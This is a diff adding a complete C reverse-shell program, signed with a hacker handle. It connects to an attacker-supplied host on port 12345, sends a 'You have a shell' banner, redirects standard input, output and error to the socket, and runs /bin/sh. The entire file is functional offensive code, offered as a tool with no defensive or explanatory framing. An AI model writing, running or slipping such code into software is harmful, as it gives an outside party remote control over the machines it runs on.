@@ -1,0 +1,59 @@
+// Wr1tt3n by phr0z
+
+#include <netdb.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <stdarg.h>
+
+#define PORT 12345 // the port client will be connecting to
+
+#define SHELL "/bin/sh" // the type of shell we r g0nna spawn
+
+int main(int argc, char *argv[]) {
+   
+   int sockfd; 
+   struct hostent *he;
+   struct sockaddr_in server;
+   char text[] = "You have a shell\r\nWoot?\r\n"; // Our L33T h4x M3ss4g3
+
+   if (argc != 2) {
+       fprintf(stderr,"usage: h0stname/ip\n");
+       exit(1);
+   }
+
+   if ((he=gethostbyname(argv[1])) == NULL) {
+       perror("gethostbyname");
+       exit(1);
+   }
+
+   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+       perror("socket");
+       exit(1);
+   }
+
+   server.sin_family = AF_INET;
+   server.sin_port = htons(PORT);
+   server.sin_addr = *((struct in_addr *)he->h_addr);
+   memset(&(server.sin_zero), '\0', 8);
+
+   if (connect(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
+       perror("connect");
+       exit(1);
+   }
+
+   send(sockfd, text, strlen(text), 0);
+   
+   dup2(sockfd, STDIN_FILENO);
+   dup2(sockfd, STDOUT_FILENO);
+   dup2(sockfd, STDERR_FILENO);
+   setsid();
+   system("last -1 $USER | head -n 1; cat /etc/motd");
+   execve(SHELL, NULL, NULL);
+   close(sockfd);
+   return 0;
+} 
